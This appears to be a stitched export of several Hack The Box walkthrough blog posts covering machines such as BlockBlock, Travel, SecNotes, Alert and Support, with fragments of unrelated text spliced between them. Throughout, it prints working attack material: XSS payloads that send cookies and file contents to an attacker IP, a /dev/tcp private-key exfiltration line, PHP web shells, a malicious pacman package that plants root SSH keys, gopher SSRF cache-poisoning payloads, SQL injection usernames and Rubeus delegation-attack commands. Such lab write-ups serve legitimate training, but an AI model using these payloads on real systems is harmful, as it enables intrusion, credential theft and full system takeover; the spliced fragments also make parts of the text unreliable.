Once a shell on the target is obtained, a program that can be run with sudo is discovered. The program loads arbitrary PyTorch models to evaluate them against a protected dataset. While it is known that such models are susceptible to insecure deserialisation, fickling is used to scan the dataset for insecure pickle files , prior to loading the model. Malicious code can be injected into a model, using runpy to bypass the fickling checks.\nReconnaissance # Initial Nmap scan revealed two open ports.

The vulnerability could allow an attacker to obtain credentials and then use them to log back into affected systems. The attacker would then acquire user rights on a system identical to the user rights of the logged-on user. This scenario could ultimately result in remote code execution on affected systems. An attacker who successfully exploited this vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights.

Which is different from my previous requests After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it with the help of Cyberchef and got a password and username from it. Logged in using SSH and got the User flag Pivoting # User keira can sudo as user paul on a binary called forge forge is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like Foundry for Ethereum development and that\u0026rsquo;s my speculation at first or any it could be someother CLI-based tool with the name forge After hours of research I found that I can use flatten option in forge to write on any file. When someone login in using SSH by a private key, SSH checks the authenticity of the key with its public key on the system. Here using the flatten option in forge, I can simply write the Public key of the user keira to the user paul\u0026rsquo;s public key in his home directory. After that on passing the private key of the user keira I can get ssh shell as user paul Step-1 # - On the system created ssh keys using this command ssh-keygen Step-2 # Copy the public key of user keira to the /tmp folder and Give all necessary permissions. cp .ssh/id_ed25519.pub /tmp/pub chmod 644 /tmp/pub Step-3 # Exploit it using the flatten option to write the public key to the user paul\u0026rsquo;s home directory in this .ssh/authorized_keys file sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys Step-4 # Now share the private key to the attacker\u0026rsquo;s system and login using the private key as user paul python3 -m http.server --directory .ssh/ Got access as user paul Privilege Escalation # As we can see user paul has SUDO privilege to run pacman To exploit this, we can create an own malicious package and install it using pacman. Initially I was struggling cause of my malicious package that I made is not working as intended. Then after that I used a script from my friend\u0026rsquo;s blog TheCyberSimon. Kindly support his blog too This time the package works #!/bin/bash # Create a working directory mkdir priv \u0026amp;\u0026amp; cd priv # Generate PKGBUILD file cat \u0026lt;\u0026lt;EOF \u0026gt;PKGBUILD pkgname=privesc pkgver=1.0 pkgrel=1 pkgdesc=\u0026#34;Privilege Escalation Package\u0026#34; arch=(\u0026#39;any\u0026#39;) url=\u0026#34;http://example.com\u0026#34; license=(\u0026#39;GPL\u0026#39;) depends=() makedepends=() source=(\u0026#39;authorized_keys\u0026#39;) sha256sums=(\u0026#39;SKIP\u0026#39;) package() { install -Dm755 \u0026#34;\\$srcdir/authorized_keys\u0026#34; \u0026#34;\\$pkgdir/root/.ssh/authorized_keys\u0026#34; } EOF # Generate SSH keys ssh-keygen -t rsa -b 4096 -f id_rsa -N \u0026#34;\u0026#34; mv id_rsa.pub authorized_keys # Build the malicious package makepkg # Output message echo \u0026#34;Malicious package created!

The malicious code will write the root user\u0026rsquo;s authorized_keys file with our public key This script will also create ssh key for the current system in the current directory without any password and then it will replace the public key to authorized_keys Then It will execute this command makepkg. Which will compile the malicious package and will also move the newly created key. Transfer this malicious package to the target\u0026rsquo;s system and install it using sudo On the host system give all the necessary permissions to our private key and use it to login System have been Rooted successfully Summary # First, the initial scan showed the usual suspects: SSH and a web server on port 80. Right away, the web app looked like a Web3 chat thing powered by Ethereum, which was a bit different. I made an account and poked around. The chat was there, and I noticed this \u0026ldquo;Report User\u0026rdquo; button that felt a bit off. Found an admin page too, but no luck getting in at that point.\nNext came the poking and prodding. That \u0026ldquo;Report User\u0026rdquo; button turned out to be a sweet spot for XSS. The admin on the other end seemed keen on clicking my crafted alerts. Used ChatGPT to whip up a payload to snag their cookie – and it worked like a charm, giving me access to the /admin page. Digging through the source there, I spotted a json-rpc endpoint. That got my attention, especially the eth_blockNumber function. I started messing with the block numbers and noticed I could pull data. One of those inputs looked like hex, so a quick decode with Cyberchef later, and boom, username and password.Time to get in. I took those credentials straight to SSH and landed a shell.Got the user flag, easy enough.\nNow for the real fun – getting root. I saw that user keira could run forge as sudo for paul. Did a bit of digging on forge and saw the flatten option could write files. So, I generated some SSH keys, dropped keira\u0026rsquo;s public key in /tmp, and then used forge flatten to overwrite paul\u0026rsquo;s authorized_keys with it. That gave me SSH access as paul using keira\u0026rsquo;s private key. From there, I noticed paul could run pacman with sudo. I cooked up a simple script to create a malicious package that would replace root\u0026rsquo;s authorized_keys with my own public key. After transferring it over and installing with sudo pacman, I logged in as root with my key and grabbed the root flag. Another one down.\n","date":"29 March 2025","externalUrl":null,"permalink":"/posts/1743038151313-blockblock-walkthroughhack-the-box/","section":"Posts","summary":"","title":"BlockBlock Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"29 March 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"29 March 2025","externalUrl":null,"permalink":"/tags/web3/","section":"Tags","summary":"","title":"Web3","type":"tags"},{"content":" About # Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server.

Definition Memcache module provides handy procedural and object-oriented interface to memcached, highly effective caching daemon, which was especially designed to decrease database load in dynamic web applications. The Memcache module also provides a session handler (memcache). More information about memcached can be found at » http://www.memcached.org/.\nif ($url) { $simplepie = new SimplePie(); $simplepie-\u0026gt;set_cache_location(\u0026#39;memcache://127.0.0.1:11211/?timeout=60\u0026amp;prefix=xct_\u0026#39;); This function get_feed gets the URL for feed. $url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if(strpos($url, \u0026#34;custom_feed_url\u0026#34;) !== false){ $tmp = (explode(\u0026#34;=\u0026#34;, $url)); $url = end($tmp); } else { $url = \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34;; } $feed = get_feed($url); customefeed.xml has the data in xml format, and the contents match Awesome RSS Again this code function requests query string custom_feed_url for customfeed.xml $url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if(strpos($url, \u0026#34;custom_feed_url\u0026#34;) !== false){ $tmp = (explode(\u0026#34;=\u0026#34;, $url)); $url = end($tmp); } else { $url = \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34;; } If the condition satisfies then it splits the URL by '=' with using explode function like this awesome-rss/?custom_feed_url=QUERY_STRING. Else it will simply sets the url to http://www.travel.htb/newsfeed/customfeed.xml So let\u0026rsquo;s test this by making the URL to look like this: http://blog.travel.htb/awesome-rss?custom_feed_url\u0026amp;rss=http://10.10.14.16/rss I opened a netcat like this nc -lnvp 3888 listener and sent a curl request with the above URL Got a hit on my listener, I can see it in the logs.

Definition Gopher is a protocol. It was designed for distributing, searching, and retrieving documents over the Internet. Gopher represented an early alternative to the World Wide Web. The gopher protocol has some things HTTP-based clients do not have. It is based on menus. An item selected from a menu will either open another menu, or a document.\nThe bottom line is, Gopher is a very old protocol that used before http and delivers the message without any useless headers. Testing with Gopher # I can test gopher like this curl -s \u0026#39;gopher://10.10.14.16:6001//testing\u0026#39; I can see that gopher successfully transfers the message without any Headers Now that I tested gopher for the memcache , I saved a local copy of customfeed.xml as sec.xml I opened a python http server and I requested for the file that I made, using SSRF that I discovered earlier curl -s http://blog.travel.htb/awesome-rss/\\?custom_feed_url=http://10.10.14.16:8000/sec.xml Actually It saved the file that I made as some data into it\u0026rsquo;s cache. Now I can see two data values This definitely could be a hash generated value. Understanding Memcache # Next I called for the local host using Gopher protocol Gopherus is a tool that generates SSRF payloads using gopher protocol. For testing I gave exploitEmp5r0R as a payload value As I already know about the filters for custom_feed_url to bypass the them I can replace the localhost with it\u0026rsquo;s decimal representation which is 2130706433 . Hex value is also applicable Now the payload becomes http://blog.travel.htb/awesome-rss/\\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a Sent it using curl curl -s http://blog.travel.htb/awesome-rss/\\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a With debug I can see that it actually worked As this is a MD5 generated hash, I could also recreate it. This cache stores md5 hash of customfeed.xml with including the whole URL echo -n \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34; | md5sum The Memcached get\u0026rsquo;s md5 sum of something with using the key spc. I learnt about this while googling memcache. I could see the whole source code on the internet as memcache is opensource. Now lets make another with the new found key spc echo -n \u0026#34;3903a76d1e6fef0d76e973a0561cbfc0:spc\u0026#34; | md5sum I can see this hash value matches to the value from debug Exploitation # I can generate the serialized object by tweaking template.php code a little by injecting a malicious payload Crafting the payload # \u0026lt;?php class TemplateHelper { public $file; public $data; public function __construct(string $file, string $data) { $this-\u0026gt;init($file, $data); } private function init(string $file, string $data) { $this-\u0026gt;file = $file; $this-\u0026gt;data = $data; file_put_contents(__DIR__.\u0026#39;/logs/\u0026#39;.$this-\u0026gt;file, $this-\u0026gt;data); } } $pwn = new TemplateHelper(\u0026#34;shell.php\u0026#34;, \u0026#34;\u0026lt;?php system(\\$_GET[emperor]); ?\u0026gt;\u0026#34;); echo serialize($pwn); ?\u0026gt; This code will generate a serialized object for the malicious payload which on using will be saved as shell.php within the logs folder.

Attempts to SSH as this user also fail, as the server denies password-based authentication. The ssh configuration file also gives us more details regarding this. (Ref: /etc/ssh/ssh_config and /etc/ssh/sshd_config) The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute on LDAP Lets try changing the password for user lynik to password of our choice Click on new Attribute and type userPassword then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish. I can see the commands used in the background for this, below. To login as user lynik I have to put the public key to the system via LDAP Now to login using ssh I created keys using ssh-keygen and then copied the public key. In Apache directory studio create new attribute objectClass and the click finish Then on the prompt select ldapPublickey, click finish after selecting it. Create another attribute sshPublickey then on the prompt click \u0026quot;edit as text\u0026quot;, after paste the public key. Click finish. Transferred the private key to my system. cat id_rsa \u0026gt; /dev/tcp/10.10.14.16/8001 After giving all the necessary permissions, used the private key to login as user lynik I can see user lynik group is in 5000 I can actually change the group to root\u0026rsquo;s group. But first I have to find the UID for root group cat /etc/group | grep -i sudo Found root group to be 27 so changed the group ID to 27 in the LDAP. After re-login I can see the changes Got the Root flag Summary # This walkthrough details the full compromise of travel.htb, a Linux-based target. Reconnaissance revealed open ports (22, 80, 443), a WordPress site (blog.travel.htb), and an exposed .git directory. Enumeration uncovered an outdated WordPress 5.4 installation with XML-RPC enabled and a vulnerable rss_template.php file. Exploiting an SSRF vulnerability, cache poisoning in Memcached, and PHP object injection, a web shell was uploaded, leading to remote code execution. Pivoting further, a MySQL database dump exposed credentials, and an .ldaprc file hinted at LDAP-based authentication. Using .viminfo, a stored password was retrieved, granting access to lynik-admin via SSH. By modifying LDAP attributes, the user’s group was changed to root (27), escalating privileges and leading to complete system takeover. This successful attack leveraged SSRF, cache poisoning, and LDAP misconfigurations to achieve root access and capture the final flag.\n","date":"28 March 2025","externalUrl":null,"permalink":"/posts/1742495331851-travel-walkthroughhtb/","section":"Posts","summary":"","title":"Travel Walkthrough(Hack The Box)","type":"posts"},{"content":" Content Sharing \u0026amp; Attribution # You are free to share, republish, or reference the content from Secure The Throne, as long as you:\nGive proper credit by mentioning Secure The Throne as the original source.\nProvide a clear link back to the original article on this site.\nDo not alter the content in a way that misrepresents the original meaning.\nTerms \u0026amp; Conditions # By accessing and using this site, you agree to the following terms:\nNo Legal or Professional Advice – The cybersecurity tips and insights shared here do not constitute professional security advice.

The machine also showcases that we must be careful when sharing open-source configurations to ensure that we do not reveal files containing passwords or other information that should be kept confidential.\nReconnaissance # I scanned the ports with rustscan and we have three ports open 80,22,3000 respectively as shown in the below image First I checked Port 80 and it runs a website called greenhorn. The noticeable thing is it had a loginpage. While poking around more I found that this greenhorn page uses Pluck CMS, which is sensitive as it goes. Definition Pluck is a small and simple content management system (CMS), written in PHP. With Pluck, you can easily manage your own website. Pluck focuses on simplicity and ease of use. This makes Pluck an excellent choice for every small website. Licensed under the General Public License (GPL), Pluck is completely open source. This allows you to do with the software whatever you want, as long as the software stays open source.\nOnto the next port 3000, It runs Gitea on it, Also it had repo of the greenhorn page from port 80 The crazy thing is I was able to access the repo without any form of authentication. Enumeration # As we got a exposed repo I was desperately searching for something sensitive, while on that login.php seemed Interesting.

While enumerating I found an exploit on exploit-DB for pluck (ref: CVE-2023-50564) Many CMS can be exploited by shipping a bad piece code to it\u0026rsquo;s managed web. Similar to the Sea box this CMS can also be exploited by installing a module with malicious code within it. I made a zip with reverseshell.php(Malicious code for reverse shell) included in it. Exploitation # To install the module I went to manage modules and uploaded the zip by clicking install module Then I found out installed modules are stored like this \u0026lt;URL\u0026gt;/data/modules/\u0026lt;zip_extracts_here\u0026gt; with the help of repo Triggered the reverse shell by visiting the malicious code(i.e. reverseshell.php) and got the connection Pivoting # From enumeration I learnt that there is an user called junior on the machine. I just tried using the previously cracked password and it worked for the user junior Got the User flag Privilege Escalation # In the home directory of junior, there is not only user flag but also a file named Using OpenVAS.pdf was also there. So I transferred the pdf file to my attack machine These were it\u0026rsquo;s contents Interesting right, Root password is blured From this article I found that actually, blured part can be recovered Using this tool Depixelization I can easily recontruct the particular blured sentence There is an option in my pdf reader to extract only the pix-elated part from the PDF as an image which was convinient for me. I Saved the image as png and then used the tool on that to get the original text python3 depix.py -p ../pixel.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../download-notepad_Windows10_closeAndSpaced.png Got the root user\u0026rsquo;s password Logged in as root and got the Root flag ","date":"26 March 2025","externalUrl":null,"permalink":"/posts/1742404292339-greenhorn-walkthroughhtb/","section":"Posts","summary":"","title":"Greenhorn Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # As usual I started with a Nmap scan, as for the interesting ones we got port 445 and 80, 8808 open Web port for an Active Directory seems interesting so I quickly checked the port 80 and we got a login page Also with an option to signup for creating new account. This website offeres notes saving feature for it\u0026rsquo;s users. For starters I registered an account and logged in. After a while I started enumerating. Then I noticed something, its getting the notes listed by using the username and also displays the username on the page. Seems good isn\u0026rsquo;t it. Exploitation # There are two ways to exploit this website, I am listing the both ways down Testing SQL Injection -\u0026gt; Path-1 # After seeing this, the idea of sql Injection suddenly sparked within my brain. As this lists notes for the site merely using username is bad cause a simple valid SQL injection payload might make the backend to list all the notes on the server it includes notes of all users. If you haven\u0026rsquo;t heard of SQL injection and if it\u0026rsquo;s new to you I already have a short post on SQL injections for begginers. Please check it I started the attack, First I tried 'or 1=1 -- - on the login page it didn\u0026rsquo;t worked so, the idea here is to create an account with this as the username 'or 1=1 -- -. I created an account with the username of 'or 1=1 -- - and it was a success. There is no validation for usernames, Actually in my opinion validation on everything is a requirement. With the malicious username now I can view everyone\u0026rsquo;s notes I searched through all the notes and from one of the notes I got a password and username for SMB share. CSRF/XSRF -\u0026gt; Path-2 # After creating a normal account and loggin in. We can see a beautiful page with with many options. When we visit the Contace Us page we could see a username tyler@secnotes.htb. Down to the name we can see a message box. Whatever message we write there will be sent to tyler@secnotes.htb as he is the recipient. Lets test this field, I opened netcat listener on port 7001 like this nc -lnvp 7001 When I send a http link with my IP through the contact form like this http://10.10.14.16:7001 I can see a connection on my listener. ❯ nc -lvnp 7001 listening on [any] 7001 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.10.97] 50700 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228 Host: 10.10.14.16:7001 Connection: Keep-Alive There is a vulnerable fuction in this website. Which is the password changing function. The account password changing request doesn\u0026rsquo;t include any CSRF token, so we can abuse this by a CSRF attack. Definition What is Cross-site Request Forgery(CSRF/XSRF)\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. Source: portswigger Prevention\nThis can be easily prevernted by pressing a CSRF token with each request, A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.\nNow lets carry on with our attack. The change_pass.php uses html body for it\u0026rsquo;s data.

But At this point i\u0026rsquo;m 100% positive that this share is for the site hosted on web port 8808. I could easily upload a reverse shell and trigger it by going to the path as this is a web port. Wasted literally two hours cause web shells were not working, then after that restarted the machine and got one worked. Shell # I Created a file with this code and named it cd.php. \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; This above payload will enable command execution on the system.

Typically WSL run as root/administrator. If I could excute the bash I could escalate my privilege. To My undertstanding there should a system link file of bash as bash.exe. So to exploit this we can search for bash.exe file where /R c:\\ bash.exe Pivoting # I got the path and after executing bash.exe I got root access easily on the wsl. Moments after stablizing the shell using python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)', I enumerated and read the history of the commands in the terminal and there I could see administrator password for a share. Now I logged in to the share using the administrator\u0026rsquo;s password. smbclient -U \u0026#39;administrator%password\u0026#39; \\\\\\\\10.10.10.97\\\\c$ Downloaded the root.txt file using get command Acquired Root flag Summary # I identified three open ports: 445 (SMB), 80 (HTTP), and 8808 (HTTP). I started by checking out the web server on port 80, which had a login page with a signup option. I decided to register an account, and I noticed that the notes displayed seemed to be tied to the username. This made me think about potential vulnerabilities, so I attempted an SQL injection by creating an account with the username \u0026lsquo;or 1=1 \u0026ndash; -. To my surprise, this worked, and I was able to view all the notes in the system. I also found another way which is a CSRF attack, I generated a password change request and sent the malicious URL to the user tyler through the contact form. Eventually tyler clicked the link which made to change password for his account. One of the notes contained a username and password for an SMB share. I connected to this share, which appeared to be the web directory for the HTTP server running on port 8808, allowing me to upload files. I tried uploading web shells, but they didn\u0026rsquo;t work initially. After restarting the machine, I finally got a PHP reverse shell to execute, granting me user access and the user flag. After gaining a foothold, I noticed some suspicious files in the C:\\ directory, which hinted at the possibility of WSL (Windows Subsystem for Linux) being present. I explored this further and located the bash.exe file. Executing it gave me root access to the Linux environment within WSL. To stabilize my access, I spawned a proper TTY shell and then checked the command history, where I found an administrator password for a share.\n","date":"24 March 2025","externalUrl":null,"permalink":"/posts/1742232333948-secnotes-walkthroughhtb/","section":"Posts","summary":"","title":"SecNotes Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # Started with a Nmap scan, revealing open ports: 22, 80. From the scan results I can also see 12227 port open which is also interesting. The scan results showed that Apache2 was hosting the website. The website featured a markdown reader page, The Basic functionality of this website is, get\u0026rsquo;s markdown file from the user and then reads the contents of the particular file for displaying it\u0026rsquo;s contents on the website. This website also included a share option for the rendered content. Again, it also has a simple contact form Now it should be obivious that this website uses HTML and JavaScript to render the contents like any other site on the internet I uploaded a .md file with JavaScript snippet init for testing, below were the contents of my md file\nAs expected the contents were rendered and loaded like this This is quite bad. It can execute arbitrary code as it renders the contents Exploitation # Also another functionality in this website is pretty straight forward, where in contact form whatever link is filled and sent seems to be clicked by an admin. We can easily get the admin\u0026rsquo;s cookie by making a .md file with malicious payload and by sharing the .md file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). More dangerously we could also read arbitrary files using the message.php So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=/etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; To trigger this payload, View it and use the share option and get the link, share it to the dumb admin via contact form. After many tries I got this correct I modified the payload accordingly to read the target file \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; Found couple of users. The configs for apache2 websites generally resides at /etc/apache2/sites-available/000-default.conf I learnt this from enumerating my own machine. After I modified the original payload to read this configuration file and I got the output. Got the .htpasswd location. Usually this file contains the passwords or hashes for apache2. Within that file, password hash for user albert was there\nLet\u0026rsquo;s crack the hash I used hashcat to crack this hash hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1600 --username Here I specified module 1600 to crack apache type hash and with as albert username is presented with the hash we have to specify --username flag Now I can use ssh to login as user albert I got the User flag Sorry I accidently nuked the user flag image Privilege Escalation # General SUID, SGID, Capabilities didn\u0026rsquo;t had anything promising But anyway there was a internal web service running on port 80 ss -tunlp so I tunneled it to my machine via ssh on port 2000. ssh -L 2000:localhost:8080 albert@alert.Hack The Box The web service name is litterely websitemonitor which tracks and monitor the websites like alert.htb I found the website\u0026rsquo;s directory location at /opt/websitemonitor The configuration files for this website are stored within /config The the web root folder of this website has root privileges and Albert also have access to modify it. So to escalate my privileges I changed the file to a reverseshell. Eventually secured Root flag Summary # The \u0026ldquo;Alert\u0026rdquo; box was approached with an initial reconnaissance phase where an nmap scan revealed three open ports: SSH (port 22) and a web server (port 80). The web server was identified as running Apache2 and hosting a Markdown reader page.\nDuring the enumeration phase, it was discovered that the Markdown reader could execute code embedded within the Markdown content. Additionally, a contact form was found to be exploitable because the administrator would click on links sent through it without analyzing them, suggesting a potential Local File Inclusion (LFI) vulnerability. This LFI was exploited by crafting a payload and sending it to the admin via the contact form. This allowed for the discovery of user information and the location of the Apache2 configuration file, which contained the path to the .htpasswd file. The password hash for the user albert was found within this file.\nThe exploitation phase also involved cracking albert\u0026rsquo;s password hash using hashcat. The cracked password enabled successful SSH login, granting initial user access and the user flag.\nFor privilege escalation, an internal web service named \u0026ldquo;websitemonitor\u0026rdquo; was discovered running on port 8080. This port was tunneled to the attacker\u0026rsquo;s machine via SSH. The configuration files for \u0026ldquo;websitemonitor,\u0026rdquo; including the web root, were located in /opt/websitemonitor/config. As the user albert and root had permissions to modify files in the web directory,I replaced a file with a reverse shell, leading to root access and the acquisition of the root flag.\n","date":"22 March 2025","externalUrl":null,"permalink":"/posts/1742495783286-alert-walkthroughhtb/","section":"Posts","summary":"","title":"Alert Walkthrough(Hack The Box)","type":"posts"},{"content":" About # Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.\nReconnaissance \u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Jarmis |_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!)

If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647).

After connecting to the share, an executable file is discovered that is used to query the machine\u0026amp;amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through SharpHound, and BloodHound reveals that the Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\\System is received. Reconnaissance \u0026amp; Enumeration # The port scan reveals multiple open ports As always we got LDAP, Netbios, SMB etc ports open Using smbclient I enumerated for smb shares and we got the share list smbclient -L support.htb However the interesting share here is support-tools. Using netexec I confirmed the guest login and it was a success netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; I enumerated for guest shares and we got access to two shares netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; --shares So I checked the share support-tools and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar I decided to enumerate all the zips from the share. Initially the zips didn\u0026rsquo;t provide me with anything interesting so I moved on to enumerate LDAP. nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; -p 389 support.htb Then I enumerated for users using netexec from smb and got the users list Removed all unwanted texts from the list cat users.txt | grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users-smb.txt I Stored the users in a file. UsersInfo.exe analysis # Remember the file UsersInfo.exe.zip that we have downloaded from SMB share. At first I didn\u0026rsquo;t notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share On running UsersInfo.exe with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly. For an example the tool returned me a error No such object meaning the requested user cannot be found within LDAP\nThis tool doesn\u0026rsquo;t use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password. In the LDAP I can see it authenticate as user ldap with the password. As I got a username and password I can now collect data for bloodhound Getting data for Bloodhound Exploitation # If we search the results of ldapsearch , particularly in the info field I can get another password.

Follow the steps below carefully Required Tools PowersView.ps1 Powermad.ps1 Rubeus.exe(Pre build from SharpCollection) Step 1: Upload all the tools to the target system, then # Do the following in the winrm shell cd C:\\\\programdata\nupload PowersView.ps1\nupload Powermad.ps1\nupload Rubeus.exe\nStep 2: Invoking all the scripts # . .\\PowerView.ps1 . .\\Powermad.ps1 Step 3: Creating a Fake Computer # New-MachineAccount -MachineAccount \u0026lt;Computername\u0026gt; -Password $(ConvertTo-SecureString \u0026#39;\u0026lt;Password\u0026gt;\u0026#39; -AsPlainText -Force) We need SID of the computer that we have created earlier, so that we can assign that value to a variable $fakesid = Get-DomainComputer \u0026lt;Computername\u0026gt; | select -expand objectsid Step 4: Configuring # Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC Definition What is ACL? An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes. Purpose: ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection.\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} Step 5: Auth as the Computer # .\\Rubeus.exe hash /password:\u0026lt;Password\u0026gt; /user:\u0026lt;ComputerName\u0026gt; /domain:support.htb Now copy the rc4_hmac hash from the output Step 6: Get the Kerberos Ticket # .\\Rubeus.exe s4u /user:\u0026lt;Computername\u0026gt;$ /rc4:\u0026lt;Hash\u0026gt; /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt Now ticket will be captured.

But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. After a while, I found that there is a cache server running along with the web server, which is called varnish, Actually we could\u0026rsquo;ve learned about this from the source code(repo) too Varnish Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.\nApparently this caching server will cache the same page for all users for quick loading of contents\nAgain after a while I found that when using X-Forwaded-Host: header on the request of pages like /home and /firewalls actually loads it\u0026rsquo;s value on the response and caches the same page for everyone(including admin) using varnish caching server. \u0026#34; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;https://10.10.14.12:8000/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; So I made and used the the above xss payload to get admin cookie which was successful. Even after including the admin cookie, still haproxy blocking my request to the page /logs which was frustrating I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called h2csmuggler and using that tool I was easily able to bypass the 403 of /logs From the response I got the location of logs files After hours of checking the logs files, I came to know that it didn\u0026rsquo;t has anything useful, Full of garbage h2csmuggler.py -x http://caption.htb:80 -H \u0026#39;Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo\u0026#39; \u0026#39;http://caption.htb:80/download\u0026lt;redacted\u0026gt; See it\u0026rsquo;s garbage contents yourselves But on visiting the plain url without the logs path it rather reveals something interesting These ./cpr folders are looking interesting aren\u0026rsquo;t they Researched about them and found a vulnerability in copyparty, 